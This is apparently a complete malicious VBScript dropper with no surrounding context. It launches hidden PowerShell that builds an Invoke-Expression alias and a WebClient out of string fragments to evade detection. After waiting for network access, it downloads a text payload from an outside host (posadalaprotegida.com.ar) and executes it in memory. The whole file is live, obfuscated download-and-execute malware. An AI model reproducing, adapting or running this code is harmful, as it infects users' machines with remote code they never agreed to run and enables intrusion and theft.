
Dim oShell
Set oShell = WScript.CreateObject ("WSCript.shell")
oShell.run "Powershell " + mkwelld() + welllf(),0



Function mkwelld()
mkwelld="$t0='DE5'.replace('D','I').replace('5','x');sal P $t0;$ErrorActionPreference = 'SilentlyContinue';$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;'[void' + '] [Syst' + 'em.Refle' + 'ct"

End Function 

Function welllf()
welllf="ion.Asse' + 'mbly]::LoadWi' + 'thPartialName(''Microsoft.VisualBasic'')'|P;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty='(New-'+'Obje'+'ct Ne'+'t.We'+'bCli'+'ent)'|P;$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'Down' + 'load' + 'Str' + 'ing',[Microsoft.VisualBasic.CallType]::Method,'h' + 'tt' + 'ps' + '://posadalaprotegida.com.ar/temp.txt')|P"
End Function 